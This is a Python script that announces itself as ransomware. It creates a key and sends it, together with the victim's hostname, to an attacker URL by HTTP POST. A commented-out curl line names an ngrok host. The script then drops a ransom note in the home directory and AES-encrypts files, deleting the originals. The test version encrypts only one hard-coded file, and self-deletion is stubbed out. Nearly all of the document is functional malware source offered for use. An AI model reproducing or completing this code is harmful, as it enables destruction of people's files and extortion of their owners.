#The goal of this script is to create a ransomware that will encrypt all files in a directory and then delete the original files.
#The script will then create a ransom note and place it in the directory.
#The script will then create a key, and then send the key back to us via email.
#The script will then delete itself.

import os
import sys
import string
import random
import time
import requests
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend



#This function will encrypt the file using the key.
def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
    """Encrypts a file using AES (CBC mode) with the given key.

    key:
        The encryption key - a bytes object of length 16, 24, or 32.

    in_filename:
        Name of the input file

    out_filename:
        If None, '<in_filename>.enc' will be used.

    chunksize:
        Sets the size of the chunk which the function uses to read
        and encrypt the file. Larger chunk sizes can be faster for
        some files and machines. chunksize must be divisible by 16.
    """
    #Convert the key to a byte array.
    key = bytes(key, 'utf-8')

    if not out_filename:
        out_filename = in_filename + '.nile'
    #encrypt the file
    iv = os.urandom(16)
    encryptor = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend()).encryptor()

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk) % 16)
                outfile.write(encryptor.update(chunk))

            outfile.write(encryptor.finalize())
    deleteFile(in_filename)

#This function will delete the original file.
def deleteFile(filename):
    #Delete the original file.
    os.remove(filename)




#This function will create a ransom note.
def ransomNote(url):
    #If ransome note already exists, then do nothing.
    if os.path.exists("README.txt"):
        return
    #Else, create ransom note.
    else:
        #Create txt file with the key.
        #create readme.txt file
        #Get the home directory.
        home = os.path.expanduser("~")
        #Change to the home directory.
        os.chdir(home)
        #Create the ransom note.
        f = open("README.txt", "w", encoding="utf-8")
        f.write("Your files have been encrypted. To decrypt your files, you must go to this website: " + url + " and enter the key that was sent to you via email.")
        f.close()

#This function will send the key to us via https post request.
def sendKey(key, url):
    #Use curl to send the key to us.
    #os.system("curl -X POST -d " + key + " https://ceaa-34-207-190-218.ngrok.io")
    #Use requests to send the key to us.
    #Convert the key to a string.
    nkey = str(key)
    payload = {"key": nkey, "host": os.uname()[1]}
    headers = {'Content-Type': 'application/json'}
    response = requests.post(url, json=payload, headers=headers)
    #print(response.status_code)
    #if response was successful, then delete the key.
    if response.status_code == 200:
        return True
    #else, wait 10 seconds and try again.
    else:
        time.sleep(10)
        sendKey(key, url)
    return




def createKey():
    #Create a random key.
    key = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
    return key



def main():
    if len(sys.argv) == 1:
        url = input("Enter the url to send the key to: ")
    else:
        url = sys.argv[0]
    
    key = createKey()
    sendKey(key, url)
    ransomNote(url)
    #Encrypt only 1 file for testing purposes.
    encrypt_file(key, '/workspaces/simple_ransomware/file1.txt')
    #Get url to send key to from command line as an argument.
    #If no argument is given, then use ask for the url.
    #deleteScript()

if __name__ == '__main__':
    main()
